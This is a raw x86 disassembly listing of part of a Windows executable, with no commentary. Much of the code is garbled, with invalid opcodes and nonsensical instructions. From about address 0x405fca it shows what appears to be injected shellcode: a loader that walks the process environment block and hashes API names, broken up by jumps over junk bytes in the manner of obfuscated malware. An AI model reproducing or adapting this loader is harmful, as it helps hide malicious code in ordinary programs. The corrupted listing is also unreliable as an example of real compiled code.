  405ada:	8b 7d 7a             	mov    0x7a(%ebp),%edi
  405add:	89 1b                	mov    %ebx,(%ebx)
  405adf:	89 30                	mov    %esi,(%eax)
  405ae1:	8b 03                	mov    (%ebx),%eax
  405ae3:	c7 40 14 00 00 00 00 	movl   $0x0,0x14(%eax)
  405aea:	8b e7                	mov    %edi,%esp
  405aec:	89 51 04             	mov    %edx,0x4(%ecx)
  405aef:	a1 2a c0 d5 00       	mov    0xd5c02a,%eax
  405af4:	8b b6 83 c0 40 89    	mov    -0x76bf3f7d(%esi),%esi
  405afa:	41                   	inc    %ecx
  405afb:	08 af 13 8d 0c c1    	or     %ch,-0x3ef372ed(%edi)
  405b01:	62 b4 00 00 be 42 20 	bound  %esi,0x2042be00(%eax,%eax,1)
  405b08:	6e                   	outsb  %ds:(%esi),(%dx)
  405b09:	87 41 75             	xchg   %eax,0x75(%ecx)
  405b0c:	69 03 2f 56 89 bf    	imul   $0xbf89562f,(%ebx),%eax
  405b12:	18 e8                	sbb    %ch,%al
  405b14:	48                   	dec    %eax
  405b15:	ef                   	out    %eax,(%dx)
  405b16:	ff                   	(bad)
  405b17:	ff                   	(bad)
  405b18:	bb 75 14 8d 0c       	mov    $0xc8d1475,%ebx
  405b1d:	bd 00 00 00 00       	mov    $0x0,%ebp
  405b22:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  405b25:	c1 fd 8b             	sar    $0x8b,%ebp
  405b28:	f8                   	clc
  405b29:	c1 40 02 f3          	roll   $0xf3,0x2(%eax)
  405b2d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405b2e:	93                   	xchg   %eax,%ebx
  405b2f:	3e 83 44 75 f3 a4    	addl   $0xffffffa4,%ds:-0xd(%ebp,%esi,2)
  405b35:	8b 0b                	mov    (%ebx),%ecx
  405b37:	6d                   	insl   (%dx),%es:(%edi)
  405b38:	5e                   	pop    %esi
  405b39:	89 e1                	mov    %esp,%ecx
  405b3b:	1c 8b                	sbb    $0x8b,%al
  405b3d:	13 8b 4d 0c c2 42    	adc    0x42c20c4d(%ebx),%ecx
  405b43:	1c c7                	sbb    $0xc7,%al
  405b45:	04 01                	add    $0x1,%al
  405b47:	00 c5                	add    %al,%ch
  405b49:	00 b8 8b ed 2a 01    	add    %bh,0x12aed8b(%eax)
  405b4f:	00 00                	add    %al,(%eax)
  405b51:	00 c7                	add    %al,%bh
  405b53:	42                   	inc    %edx
  405b54:	24 00                	and    $0x0,%al
  405b56:	cf                   	iret
  405b57:	00 e9                	add    %ch,%cl
  405b59:	8b 0b                	mov    (%ebx),%ecx
  405b5b:	89 41 0c             	mov    %eax,0xc(%ecx)
  405b5e:	8b 13                	mov    (%ebx),%edx
  405b60:	89 fc                	mov    %edi,%esp
  405b62:	63 11                	arpl   %edx,(%ecx)
  405b64:	0b 5b 47             	or     0x47(%ebx),%ebx
  405b67:	41                   	inc    %ecx
  405b68:	2c 33                	sub    $0x33,%al
  405b6a:	c0 5d c2 10          	rcrb   $0x10,-0x3e(%ebp)
  405b6e:	c0 90 55 8b ec 56 8b 	rclb   $0x8b,0x56ec8b55(%eax)
  405b75:	75 08                	jne    0x405b7f
  405b77:	57                   	push   %edi
  405b78:	8b 46 14             	mov    0x14(%esi),%eax
  405b7b:	85 c0                	test   %eax,%eax
  405b7d:	75 59                	jne    0x405bd8
  405b7f:	8b 46 20             	mov    0x20(%esi),%eax
  405b82:	80 38 00             	cmpb   $0x0,(%eax)
  405b85:	75 4f                	jne    0x405bd6
  405b87:	8b 4e 07             	mov    0x7(%esi),%ecx
  405b8a:	8b 46 18             	mov    0x18(%esi),%eax
  405b8d:	3b c8                	cmp    %eax,%ecx
  405b8f:	c7                   	(bad)
  405b90:	d8 ff                	fdivr  %st(7),%st
  405b92:	6d                   	insl   (%dx),%es:(%edi)
  405b93:	00 00                	add    %al,(%eax)
  405b95:	00 a2 45 8b 56 ca    	add    %ah,-0x35a974bb(%edx)
  405b9b:	8b 04 8a             	mov    (%edx,%ecx,4),%eax
  405b9e:	89 46 58             	mov    %eax,0x58(%esi)
  405ba1:	80 38 2d             	cmpb   $0x2d,(%eax)
  405ba4:	af                   	scas   %es:(%edi),%eax
  405ba5:	16                   	push   %ss
  405ba6:	8a dd                	mov    %ch,%bl
  405ba8:	01 ee                	add    %ebp,%esi
  405baa:	84 a8 74 28 89 46    	test   %ch,0x46892874(%eax)
  405bb0:	83 8a 48 80 fa 2d 75 	orl    $0x75,0x2dfa8048(%edx)
  405bb7:	1e                   	push   %ds
  405bb8:	41                   	inc    %ecx
  405bb9:	89 4e 0c             	mov    %ecx,0xc(%esi)
  405bbc:	0d 46 20 d4 02       	or     $0x2d42046,%eax
  405bc1:	41                   	inc    %ecx
  405bc2:	14 8b                	adc    $0x8b,%al
  405bc4:	4d                   	dec    %ebp
  405bc5:	10 8a 46 19 5f 5e    	adc    %cl,0x5e5f1946(%edx)
  405bcb:	88 01                	mov    %al,(%ecx)
  405bcd:	b8 7e e7 01 d1       	mov    $0xd101e77e,%eax
  405bd2:	06                   	push   %es
  405bd3:	c2 10 f2             	ret    $0xf210
  405bd6:	8b 56 20             	mov    0x20(%esi),%edx
  405bd9:	8b 7d 0c             	mov    0xc(%ebp),%edi
  405bdc:	83 2c 02 42          	subl   $0x42,(%edx,%eax,1)
  405be0:	83 f8 3a             	cmp    $0x3a,%eax
  405be3:	89 46 1c             	mov    %eax,0x1c(%esi)
  405be6:	90                   	nop
  405be7:	56                   	push   %esi
  405be8:	20 0f                	and    %cl,(%edi)
  405bea:	4d                   	dec    %ebp
  405beb:	d0 00                	rolb   $1,(%eax)
  405bed:	00 00                	add    %al,(%eax)
  405bef:	50                   	push   %eax
  405bf0:	57                   	push   %edi
  405bf1:	e2 45                	loop   0x405c38
  405bf3:	7c b8                	jl     0x405bad
  405bf5:	40                   	inc    %eax
  405bf6:	00 83 c4 1c 85 85    	add    %al,-0x7a7ae33c(%ebx)
  405bfc:	0f 84 1f 00 00 00    	je     0x405c21
  405c02:	80 78 01 45          	cmpb   $0x45,0x1(%eax)
  405c06:	57                   	push   %edi
  405c07:	1a 8b 4d 36 c7 01    	sbb    0x1c7364d(%ebx),%cl
  405c0d:	00 00                	add    %al,(%eax)
  405c0f:	00 00                	add    %al,(%eax)
  405c11:	0d 56 20 80 ee       	or     $0xee802056,%eax
  405c16:	00 0f                	add    %cl,(%edi)
  405c18:	85 fa                	test   %edi,%edx
  405c1a:	00 00                	add    %al,(%eax)
  405c1c:	00 e9                	add    %ch,%cl
  405c1e:	8a 00                	mov    (%eax),%al
  405c20:	00 7a 95             	add    %bh,-0x6b(%edx)
  405c23:	bf 8f 80 38 00       	mov    $0x38808f,%edi
  405c28:	74 07                	je     0x405c31
  405c2a:	8b 4d 14             	mov    0x14(%ebp),%ecx
  405c2d:	89 47 eb             	mov    %eax,-0x15(%edi)
  405c30:	74 8b                	je     0x405bbd
  405c32:	4e                   	dec    %esi
  405c33:	0c 8b                	or     $0x8b,%al
  405c35:	0e                   	push   %cs
  405c36:	18 42 8b             	sbb    %al,-0x75(%edx)
  405c39:	c2 89 56             	ret    $0x5689
  405c3c:	0c 3b                	or     $0x3b,%al
  405c3e:	c8 b6 59 c7          	enter  $0x59b6,$0xc7
  405c42:	7b 20                	jnp    0x405c64
  405c44:	d4 02                	aam    $0x2
  405c46:	41                   	inc    %ecx
  405c47:	00 8a f4 4b 78 75    	add    %cl,0x75784bf4(%edx)
  405c4d:	43                   	inc    %ebx
  405c4e:	59                   	pop    %ecx
  405c4f:	45                   	inc    %ebp
  405c50:	10 8a 56 10 5f 66    	adc    %cl,0x665f1056(%edx)
  405c56:	88 10                	mov    %dl,(%eax)
  405c58:	17                   	pop    %ss
  405c59:	7d 2d                	jge    0x405c88
  405c5b:	01 d9                	add    %ebx,%ecx
  405c5d:	5d                   	pop    %ebp
  405c5e:	c2 10 00             	ret    $0x10
  405c61:	8b fe                	mov    %esi,%edi
  405c63:	96                   	xchg   %eax,%esi
  405c64:	85 c0                	test   %eax,%eax
  405c66:	57                   	push   %edi
  405c67:	1f                   	pop    %ds
  405c68:	6c                   	insb   (%dx),%es:(%edi)
  405c69:	56                   	push   %esi
  405c6a:	10 8b 4e 10 51 cc    	adc    %cl,-0x33aeefb2(%ebx)
  405c70:	02 40 ae             	add    -0x52(%eax),%al
  405c73:	86 49 00             	xchg   %cl,0x0(%ecx)
  405c76:	00 c4                	add    %al,%ah
  405c78:	7b 08                	jnp    0x405c82
  405c7a:	50                   	push   %eax
  405c7b:	68 72 f3 ca 00       	push   $0xcaf372
  405c80:	51                   	push   %ecx
  405c81:	ff 56 04             	call   *0x4(%esi)
  405c84:	83 c4 15             	add    $0x15,%esp
  405c87:	f9                   	stc
  405c88:	45                   	inc    %ebp
  405c89:	61                   	popa
  405c8a:	8a 56 10             	mov    0x10(%esi),%dl
  405c8d:	ba 5e 88 10 b8       	mov    $0xb810885e,%edx
  405c92:	7c 11                	jl     0x405ca5
  405c94:	01 00                	add    %eax,(%eax)
  405c96:	5d                   	pop    %ebp
  405c97:	c2 10 00             	ret    $0x10
  405c9a:	8b 4e 1c             	mov    0x1c(%esi),%ecx
  405c9d:	8b 14 81             	mov    (%ecx,%eax,4),%edx
  405ca0:	48                   	dec    %eax
  405ca1:	45                   	inc    %ebp
  405ca2:	14 89                	adc    $0x89,%al
  405ca4:	10 c7                	adc    %al,%bh
  405ca6:	46                   	inc    %esi
  405ca7:	20 d4                	and    %dl,%ah
  405ca9:	02 41 00             	add    0x0(%ecx),%al
  405cac:	ff 46 0c             	incl   0xc(%esi)
  405caf:	8b 55 10             	mov    0x10(%ebp),%edx
  405cb2:	8a 4e 10             	mov    0x10(%esi),%cl
  405cb5:	5f                   	pop    %edi
  405cb6:	33 c0                	xor    %eax,%eax
  405cb8:	88 46 5e             	mov    %al,0x5e(%esi)
  405cbb:	5d                   	pop    %ebp
  405cbc:	c2 10 00             	ret    $0x10
  405cbf:	83 7e 7c 2d          	cmpl   $0x2d,0x7c(%esi)
  405cc3:	0f 84 fa fe ff ff    	je     0x405bc3
  405cc9:	8b 97 20 80 25 00    	mov    0x258020(%edi),%edx
  405ccf:	75 03                	jne    0x405cd4
  405cd1:	ff 46 0c             	incl   0xc(%esi)
  405cd4:	8b 46 3b             	mov    0x3b(%esi),%eax
  405cd7:	85 c0                	test   %eax,%eax
  405cd9:	74 24                	je     0x405cff
  405cdb:	80 3f 3a             	cmpb   $0x3a,(%edi)
  405cde:	74 1f                	je     0x405cff
  405ce0:	8b 4e 1c             	mov    0x1c(%esi),%ecx
  405ce3:	8b 46 a7             	mov    -0x59(%esi),%eax
  405ce6:	50                   	push   %eax
  405ce7:	ab                   	stos   %eax,%es:(%edi)
  405ce8:	11 52 e8             	adc    %edx,-0x18(%edx)
  405ceb:	91                   	xchg   %eax,%ecx
  405cec:	db 00                	fildl  (%eax)
  405cee:	00 50 8b             	add    %dl,-0x75(%eax)
  405cf1:	46                   	inc    %esi
  405cf2:	08 68 cc             	or     %ch,-0x34(%eax)
  405cf5:	f3 40                	repz inc %eax
  405cf7:	00 50 ff             	add    %dl,-0x1(%eax)
  405cfa:	56                   	push   %esi
  405cfb:	9a 83 c4 10 bf 55 6f 	lcall  $0x6f55,$0xbf10c483
  405d02:	70 4e                	jo     0x405d52
  405d04:	32 5f b8             	xor    -0x48(%edi),%bl
  405d07:	7c 11                	jl     0x405d1a
  405d09:	01 00                	add    %eax,(%eax)
  405d0b:	88 4e 5e             	mov    %cl,0x5e(%esi)
  405d0e:	5d                   	pop    %ebp
  405d0f:	c2 10 00             	ret    $0x10
  405d12:	90                   	nop
  405d13:	90                   	nop
  405d14:	90                   	nop
  405d15:	55                   	push   %ebp
  405d16:	90                   	nop
  405d17:	90                   	nop
  405d18:	90                   	nop
  405d19:	90                   	nop
  405d1a:	90                   	nop
  405d1b:	90                   	nop
  405d1c:	90                   	nop
  405d1d:	ea 90 dc 55 8b 96 51 	ljmp   $0x5196,$0x8b55dc90
  405d24:	56                   	push   %esi
  405d25:	14 e8                	adc    $0xe8,%al
  405d27:	f5                   	cmc
  405d28:	01 bc 00 85 c0 0f 85 	add    %edi,-0x7af03f7b(%eax,%eax,1)
  405d2f:	fd                   	std
  405d30:	00 00                	add    %al,(%eax)
  405d32:	00 83 3d 45 08 e3    	add    %al,-0x1cf7bac3(%ebx)
  405d38:	00 14 0f             	add    %dl,(%edi,%ecx,1)
  405d3b:	8c ee                	mov    %gs,%esi
  405d3d:	77 00                	ja     0x405d3f
  405d3f:	00 a1 84 63 33 00    	add    %ah,0x336384(%ecx)
  405d45:	85 c0                	test   %eax,%eax
  405d47:	0f 85 e1 00 00 49    	jne    0x49405e2e
  405d4d:	f8                   	clc
  405d4e:	05 24 03 41 96       	add    $0x96410324,%eax
  405d53:	01 a3 00 00 ff 15    	add    %esp,0x15ff0000(%ebx)
  405d59:	5c                   	pop    %esp
  405d5a:	c0 40 00 8b          	rolb   $0x8b,0x0(%eax)
  405d5e:	f0 85 f6             	lock test %esi,%esi
  405d61:	74 50                	je     0x405db3
  405d63:	a1 58 03 41 00       	mov    0x410358,%eax
  405d68:	88 c0                	mov    %al,%al
  405d6a:	75 8f                	jne    0x405cfb
  405d6c:	50                   	push   %eax
  405d6d:	68 10 f4 40 f6       	push   $0xf640f410
  405d72:	6a 04                	push   $0x4
  405d74:	e8 c7 4b 00 00       	call   0x40a940
  405d79:	85 c4                	test   %eax,%esp
  405d7b:	0c a3                	or     $0xa3,%al
  405d7d:	58                   	pop    %eax
  405d7e:	03 41 88             	add    -0x78(%ecx),%eax
  405d81:	85 c0                	test   %eax,%eax
  405d83:	0f                   	movmskps (bad),%ebp
  405d84:	50                   	push   %eax
  405d85:	af                   	scas   %es:(%edi),%eax
  405d86:	1f                   	pop    %ds
  405d87:	00 92 8d a0 fc 51    	add    %dl,0x51fca08d(%edx)
  405d8d:	56                   	push   %esi
  405d8e:	ff d0                	call   *%eax
  405d90:	8b f7                	mov    %edi,%esi
  405d92:	85 f6                	test   %esi,%esi
  405d94:	74 1d                	je     0x405db3
  405d96:	8b 55 fc             	mov    -0x4(%ebp),%edx
  405d99:	cc                   	int3
  405d9a:	45                   	inc    %ebp
  405d9b:	0c 3f                	or     $0x3f,%al
  405d9d:	56                   	push   %esi
  405d9e:	50                   	push   %eax
  405d9f:	e8 2c 48 00 00       	call   0x40a5d0
  405da4:	bd 4d 08 ae c4       	mov    $0xc4ae084d,%ebp
  405da9:	0c 56                	or     $0x56,%al
  405dab:	89 01                	mov    %eax,(%ecx)
  405dad:	ff 15 58 c0 40 00    	call   *0x40c058
  405db3:	53                   	push   %ebx
  405db4:	ff 15 54 c0 2f 00    	call   *0x2fc054
  405dba:	8b d8                	mov    %eax,%ebx
  405dbc:	62 ff 53             	(bad) {rz-bad},{%k7}{z}
  405dbf:	ff 9d 24 e4 40 14    	lcall  *0x1440e424(%ebp)
  405dc5:	6e                   	outsb  %ds:(%esi),(%dx)
  405dc6:	e8 85 00 4a 00       	call   0x8a5e50
  405dcb:	8b 7d 5f             	mov    0x5f(%ebp),%edi
  405dce:	83 c4 0c             	add    $0xc,%esp
  405dd1:	f5                   	cmc
  405dd2:	ff 74 2d fd          	push   -0x3(%ebp,%ebp,1)
  405dd6:	34 85                	xor    $0x85,%al
  405dd8:	04 00                	add    $0x0,%al
  405dda:	00 00                	add    %al,(%eax)
  405ddc:	56                   	push   %esi
  405ddd:	ff 15 5c c1 40 00    	call   *0x40c15c
  405de3:	8b c4                	mov    %esp,%eax
  405de5:	04 89                	add    $0x89,%al
  405de7:	dc 0a                	fmull  (%edx)
  405de9:	15 17 c1 40 00       	adc    $0x40c117,%eax
  405dee:	8b 3f                	mov    (%edi),%edi
  405df0:	8b ce                	mov    %esi,%ecx
  405df2:	8b 30                	mov    (%eax),%esi
  405df4:	f0 d1 c1             	lock rol $1,%ecx
  405df7:	e9 02 28 a5 d0       	jmp    0xd0e585fe
  405dfc:	ca b4 e1             	lret   $0xe1b4
  405dff:	03 f3                	add    %ebx,%esi
  405e01:	20 53 4d             	and    %dl,0x4d(%ebx)
  405e04:	15 50 c0 40 00       	adc    $0x40c050,%eax
  405e09:	4e                   	dec    %esi
  405e0a:	63 28                	arpl   %ebp,(%eax)
  405e0c:	c1 40 00 ff          	roll   $0xff,0x0(%eax)
  405e10:	25 8b 08 4a 85       	and    $0x854a088b,%eax
  405e15:	c9                   	leave
  405e16:	74 78                	je     0x405e90
  405e18:	ff d6                	call   *%esi
  405e1a:	8b 6b ff             	mov    -0x1(%ebx),%ebp
  405e1d:	d6                   	salc
  405e1e:	57                   	push   %edi
  405e1f:	c7 00 00 00 00 9d    	movl   $0x9d000000,(%eax)
  405e25:	ff 15 04 c1 40 00    	call   *0x40c104
  405e2b:	83 c4 04             	add    $0x4,%esp
  405e2e:	33 c0                	xor    %eax,%eax
  405e30:	5f                   	pop    %edi
  405e31:	5e                   	pop    %esi
  405e32:	8b e5                	mov    %ebp,%esp
  405e34:	d1 c2                	rol    $1,%edx
  405e36:	0c 00                	or     $0x0,%al
  405e38:	6a 42                	push   $0x42
  405e3a:	ff 15 4c c0 40 00    	call   *0x40c04c
  405e40:	e9 6e ff ff ff       	jmp    0x405db3
  405e45:	90                   	nop
  405e46:	90                   	nop
  405e47:	90                   	nop
  405e48:	e0 90                	loopne 0x405dda
  405e4a:	90                   	nop
  405e4b:	90                   	nop
  405e4c:	90                   	nop
  405e4d:	47                   	inc    %edi
  405e4e:	5a                   	pop    %edx
  405e4f:	b2 55                	mov    $0x55,%dl
  405e51:	29 ec                	sub    %ebp,%esp
  405e53:	51                   	push   %ecx
  405e54:	8b 45 62             	mov    0x62(%ebp),%eax
  405e57:	53                   	push   %ebx
  405e58:	8b 5d 10             	mov    0x10(%ebp),%ebx
  405e5b:	56                   	push   %esi
  405e5c:	85 7f 57             	test   %edi,0x57(%edi)
  405e5f:	7d 18                	jge    0x405e79
  405e61:	bb 01 00 81 00       	mov    $0x810001,%ebx
  405e66:	66 83 38 00          	cmpw   $0x0,(%eax)
  405e6a:	0f 08                	invd
  405e6c:	d8 83 78 02 37 74    	fadds  0x74370278(%ebx)
  405e72:	06                   	push   %es
  405e73:	43                   	inc    %ebx
  405e74:	83 c0 e6             	add    $0xffffffe6,%eax
  405e77:	eb ed                	jmp    0x405e66
  405e79:	2b 45 0c             	sub    0xc(%ebp),%eax
  405e7c:	83 c0 7e             	add    $0x7e,%eax
  405e7f:	d1 f8                	sar    $1,%eax
  405e81:	89 45 10             	mov    %eax,0x10(%ebp)
  405e84:	8d 04 9d 04 00 00 00 	lea    0x4(,%ebx,4),%eax
  405e8b:	50                   	push   %eax
  405e8c:	ff 15 5c c1 40 00    	call   *0x40c15c
  405e92:	8b f8                	mov    %eax,%edi
  405e94:	8b 45 10             	mov    0x10(%ebp),%eax
  405e97:	8d 74 53 01          	lea    0x1(%ebx,%edx,2),%esi
  405e9b:	03 89 29 1b ff 15    	add    0x15ff1b29(%ecx),%ecx
  405ea1:	5c                   	pop    %esp
  405ea2:	c1 40 00 83          	roll   $0x83,0x0(%eax)
  405ea6:	c4 08                	les    (%eax),%ecx
  405ea8:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  405eab:	89 07                	mov    %eax,(%edi)
  405ead:	8d 55 b2             	lea    -0x4e(%ebp),%edx
  405eb0:	51                   	push   %ecx
  405eb1:	e2 8b                	loop   0x405e3e
  405eb3:	45                   	inc    %ebp
  405eb4:	0c e5                	or     $0xe5,%al
  405eb6:	50                   	push   %eax
  405eb7:	e8 81 4d 00 bb       	call   0xbb40ac3d
  405ebc:	8b c3                	mov    %ebx,%eax
  405ebe:	fc                   	cld
  405ebf:	8b 11                	mov    (%ecx),%edx
  405ec1:	0f f2 56 50          	pslld  0x50(%esi),%mm2
  405ec5:	ed                   	in     (%dx),%eax
  405ec6:	15 20 c1 40 00       	adc    $0x40c120,%eax
  405ecb:	b9 01 bb 00 00       	mov    $0xbb01,%ecx
  405ed0:	83 6e 08 7c          	subl   $0x7c,0x8(%esi)
  405ed4:	d9 89 b5 7e 29 8d    	(bad) -0x72d6814b(%ecx)
  405eda:	4b                   	dec    %ebx
  405edb:	ff 8d b5 04 61 4d    	decl   0x4d6104b5(%ebp)
  405ee1:	0c 41                	or     $0x41,%al
  405ee3:	8b 50 fc             	mov    -0x4(%eax),%edx
  405ee6:	83 82 02 e5 65 8b 30 	addl   $0x30,-0x749a1afe(%edx)
  405eed:	5a                   	pop    %edx
  405eee:	16                   	push   %ss
  405eef:	46                   	inc    %esi
  405ef0:	0b d2                	or     %edx,%edx
  405ef2:	89 30                	mov    %esi,(%eax)
  405ef4:	75 f0                	jne    0x405ee6
  405ef6:	8b 55 0c             	mov    0xc(%ebp),%edx
  405ef9:	83 c0 09             	add    $0x9,%eax
  405efc:	0e                   	push   %cs
  405efd:	89 55 0c             	mov    %edx,0xc(%ebp)
  405f00:	75 e1                	jne    0x405ee3
  405f02:	8b f1                	mov    %ecx,%esi
  405f04:	08 c7                	or     %al,%bh
  405f06:	e8 8f 00 00 00       	call   0x405f9a
  405f0b:	6e                   	outsb  %ds:(%esi),(%dx)
  405f0c:	89 38                	mov    %edi,(%eax)
  405f0e:	5f                   	pop    %edi
  405f0f:	21 9b d6 95 8b a1    	and    %ebx,-0x5e746a2a(%ebx)
  405f15:	ba c3 0c 90 95       	mov    $0x95900cc3,%edx
  405f1a:	90                   	nop
  405f1b:	90                   	nop
  405f1c:	6f                   	outsl  %ds:(%esi),(%dx)
  405f1d:	90                   	nop
  405f1e:	91                   	xchg   %eax,%ecx
  405f1f:	90                   	nop
  405f20:	55                   	push   %ebp
  405f21:	8b ec                	mov    %esp,%ebp
  405f23:	81 22 57 01 00 00    	andl   $0x157,(%edx)
  405f29:	a1 88 03 41 00       	mov    0x410388,%eax
  405f2e:	f4                   	hlt
  405f2f:	a3 40 85 c9 a3       	mov    %eax,0xa3c98540
  405f34:	ba 03 fa 00 74       	mov    $0x7400fa03,%edx
  405f39:	06                   	push   %es
  405f3a:	33 56 8b             	xor    -0x75(%esi),%edx
  405f3d:	e5 5d                	in     $0x5d,%eax
  405f3f:	c3                   	ret
  405f40:	8d 55 8b             	lea    -0x75(%ebp),%edx
  405f43:	52                   	push   %edx
  405f44:	02 d7                	add    %bh,%dl
  405f46:	47                   	inc    %edi
  405f47:	00 00                	add    %al,(%eax)
  405f49:	83 c4 04             	add    $0x4,%esp
  405f4c:	85 c0                	test   %eax,%eax
  405f4e:	18 9f c6 00 00 00    	sbb    %bl,0xc6(%edi)
  405f54:	ff 15 60 5d 40 35    	call   *0x35405d60
  405f5a:	46                   	inc    %esi
  405f5b:	54                   	push   %esp
  405f5c:	09 41 00             	or     %eax,0x0(%ecx)
  405f5f:	35 dc e9 ff 70       	xor    $0x70ffe9dc,%eax
  405f64:	03 c0                	add    %eax,%eax
  405f66:	4e                   	dec    %esi
  405f67:	73 50                	jae    0x405fb9
  405f69:	7e 50                	jle    0x405fbb
  405f6b:	8d 45 fc             	lea    -0x4(%ebp),%eax
  405f6e:	50                   	push   %eax
  405f6f:	1f                   	pop    %ds
  405f70:	ef                   	out    %eax,(%dx)
  405f71:	ef                   	out    %eax,(%dx)
  405f72:	3d 7b 85 c0 74       	cmp    $0x74c0857b,%eax
  405f77:	60                   	pusha
  405f78:	b8 22 4e 00 00       	mov    $0x4e22,%eax
  405f7d:	8b e5                	mov    %ebp,%esp
  405f7f:	5d                   	pop    %ebp
  405f80:	c3                   	ret
  405f81:	8b e2                	mov    %edx,%esp
  405f83:	29 68 24             	sub    %ebp,0x24(%eax)
  405f86:	f4                   	hlt
  405f87:	26 00 5d e8          	add    %bl,%es:-0x18(%ebp)
  405f8b:	d5 ea                	aad    $0xea
  405f8d:	ff 6e 8d             	ljmp   *-0x73(%esi)
  405f90:	95                   	xchg   %eax,%ebp
  405f91:	db 4d cc             	fisttpl -0x34(%ebp)
  405f94:	ff 52 39             	call   *0x39(%edx)
  405f97:	02 6a 15             	add    0x15(%edx),%ch
  405f9a:	ed                   	in     (%dx),%eax
  405f9b:	c1 40 6b fc          	roll   $0xfc,0x6b(%eax)
  405f9f:	90                   	nop
  405fa0:	eb 0c                	jmp    0x405fae
  405fa2:	61                   	popa
  405fa3:	3b af 90 38 0e 4e    	cmp    0x4e0e3890(%edi),%ebp
  405fa9:	44                   	inc    %esp
  405faa:	9b                   	fwait
  405fab:	3b 96 79 e8 16 03    	cmp    0x316e879(%esi),%edx
  405fb1:	00 00                	add    %al,(%eax)
  405fb3:	90                   	nop
  405fb4:	eb 08                	jmp    0x405fbe
  405fb6:	1b 6d 81             	sbb    -0x7f(%ebp),%ebp
  405fb9:	24 c3                	and    $0xc3,%al
  405fbb:	0b c3                	or     %ebx,%eax
  405fbd:	cd 90                	int    $0x90
  405fbf:	eb 09                	jmp    0x405fca
  405fc1:	be 6b ee 81 08       	mov    $0x881ee6b,%esi
  405fc6:	74 24                	je     0x405fec
  405fc8:	0e                   	push   %cs
  405fc9:	96                   	xchg   %eax,%esi
  405fca:	60                   	pusha
  405fcb:	90                   	nop
  405fcc:	31 d2                	xor    %edx,%edx
  405fce:	90                   	nop
  405fcf:	eb 0e                	jmp    0x405fdf
  405fd1:	7e 28                	jle    0x405ffb
  405fd3:	35 a7 51 1e dc       	xor    $0xdc1e51a7,%eax
  405fd8:	78 45                	js     0x40601f
  405fda:	39 9d 2e f3 72 64    	cmp    %ebx,0x6472f32e(%ebp)
  405fe0:	8b 52 30             	mov    0x30(%edx),%edx
  405fe3:	90                   	nop
  405fe4:	89 e5                	mov    %esp,%ebp
  405fe6:	8b 52 0c             	mov    0xc(%edx),%edx
  405fe9:	eb 0f                	jmp    0x405ffa
  405feb:	78 21                	js     0x40600e
  405fed:	3a 79 26             	cmp    0x26(%ecx),%bh
  405ff0:	2a 5d 65             	sub    0x65(%ebp),%bl
  405ff3:	bb 0d c1 02 c3       	mov    $0xc302c10d,%ebx
  405ff8:	8c 70 8b             	mov    %?,-0x75(%eax)
  405ffb:	52                   	push   %edx
  405ffc:	14 eb                	adc    $0xeb,%al
  405ffe:	0f 2f ff             	comiss %xmm7,%xmm7
  406001:	ca 79 8b             	lret   $0x8b79
  406004:	47                   	inc    %edi
  406005:	d3 77 f3             	shll   %cl,-0xd(%edi)
  406008:	ad                   	lods   %ds:(%esi),%eax
  406009:	49                   	dec    %ecx
  40600a:	66 12 5b be          	data16 adc -0x42(%ebx),%bl
  40600e:	31 ff                	xor    %edi,%edi
  406010:	90                   	nop
  406011:	eb 0a                	jmp    0x40601d
  406013:	0a 2f                	or     (%edi),%ch
  406015:	8c c5                	mov    %es,%ebp
  406017:	ab                   	stos   %eax,%es:(%edi)
  406018:	c6                   	(bad)
  406019:	db 66 e9             	(bad) -0x17(%esi)
  40601c:	10 8b 72 28 90 0f    	adc    %cl,0xf902872(%ebx)
  406022:	b7 4a                	mov    $0x4a,%bh
  406024:	26 90                	es nop
  406026:	eb 0f                	jmp    0x406037
  406028:	09 be 76 a2 6e d1    	or     %edi,-0x2e915d8a(%esi)
  40602e:	57                   	push   %edi
  40602f:	11 e1                	adc    %esp,%ecx
  406031:	b3 e9                	mov    $0xe9,%bl
  406033:	19 82 ee 8a 31 c0    	sbb    %eax,-0x3fce7512(%edx)
  406039:	eb 0b                	jmp    0x406046
  40603b:	12 8c c0 1a 83 fb 0d 	adc    0xdfb831a(%eax,%eax,8),%cl
  406042:	ff                   	(bad)
  406043:	39 d4                	cmp    %edx,%esp
  406045:	a1 ac 90 eb 0f       	mov    0xfeb90ac,%eax
  40604a:	e7 3f                	out    %eax,$0x3f
  40604c:	1c 9b                	sbb    $0x9b,%al
  40604e:	c6 04 2e f4          	movb   $0xf4,(%esi,%ebp,1)
  406052:	27                   	daa
  406053:	b1 02                	mov    $0x2,%cl
  406055:	6e                   	outsb  %ds:(%esi),(%dx)
  406056:	ed                   	in     (%dx),%eax
  406057:	28 3f                	sub    %bh,(%edi)
  406059:	3c 61                	cmp    $0x61,%al
  40605b:	eb 0d                	jmp    0x40606a
  40605d:	86 b1 90 7c 14 97    	xchg   %dh,-0x68eb8370(%ecx)
  406063:	3d ba 18 00 1f       	cmp    $0x1f0018ba,%eax
  406068:	2c 96                	sub    $0x96,%al
  40606a:	7c 14                	jl     0x406080
  40606c:	90                   	nop
  40606d:	eb 0e                	jmp    0x40607d
  40606f:	66 0e                	pushw  %cs
  406071:	2d f1 fe f5 12       	sub    $0x12f5fef1,%eax
  406076:	98                   	cwtl
  406077:	56                   	push   %esi
  406078:	76 66                	jbe    0x4060e0
  40607a:	de 1d 36 2c 20 90    	ficomps 0x90202c36
  406080:	90                   	nop
  406081:	eb 0c                	jmp    0x40608f
  406083:	23 6b f8             	and    -0x8(%ebx),%ebp
  406086:	9d                   	popf
  406087:	48                   	dec    %eax
  406088:	f7 39                	idivl  (%ecx)
  40608a:	43                   	inc    %ebx
  40608b:	9f                   	lahf
  40608c:	aa                   	stos   %al,%es:(%edi)
  40608d:	2d 22 c1 cf 0d       	sub    $0xdcfc122,%eax
  406092:	90                   	nop
  406093:	01 c7                	add    %eax,%edi
  406095:	49                   	dec    %ecx
  406096:	90                   	nop
  406097:	0f 85 89 ff ff ff    	jne    0x406026
  40609d:	90                   	nop
  40609e:	90                   	nop
  40609f:	52                   	push   %edx
  4060a0:	90                   	nop
  4060a1:	eb 0d                	jmp    0x4060b0
  4060a3:	46                   	inc    %esi
  4060a4:	4c                   	dec    %esp
  4060a5:	30 28                	xor    %ch,(%eax)
  4060a7:	15 0d 97 84 36       	adc    $0x3684970d,%eax
  4060ac:	22 e1                	and    %cl,%ah
  4060ae:	e4 39                	in     $0x39,%al
  4060b0:	57                   	push   %edi
